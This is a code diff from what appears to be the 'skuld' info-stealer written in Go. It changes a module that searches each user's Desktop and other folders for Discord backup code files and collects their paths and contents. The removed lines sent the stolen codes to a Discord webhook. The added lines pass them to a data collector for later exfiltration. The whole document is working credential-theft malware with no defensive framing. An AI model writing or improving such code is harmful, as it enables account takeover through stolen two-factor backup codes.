@@ -2,13 +2,13 @@ package discodes
 
 import (
 	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/hackirby/skuld/utils/collector"
 	"os"
 	"path/filepath"
 	"strings"
 )
 
-func Run(webhook string) {
+func Run(dataCollector *collector.DataCollector) {
 	for _, user := range hardware.GetUsers() {
 		for _, dir := range []string{
 			filepath.Join(user, "Desktop"),
@@ -40,15 +40,13 @@ func Run(webhook string) {
 				if err != nil {
 					return nil
 				}
-				requests.Webhook(webhook, map[string]interface{}{
-					"content": "`" + path + "`",
-					"embeds": []map[string]interface{}{
-						{
-							"title":       "Discord Backup Codes",
-							"description": "```" + string(data) + "```",
-						},
-					},
-				})
+				
+				// Add backup codes to collector
+				codesData := map[string]interface{}{
+					"FilePath": path,
+					"Codes":    string(data),
+				}
+				dataCollector.AddData("discord_backup_codes", codesData)
 				return nil
 			})
 		}
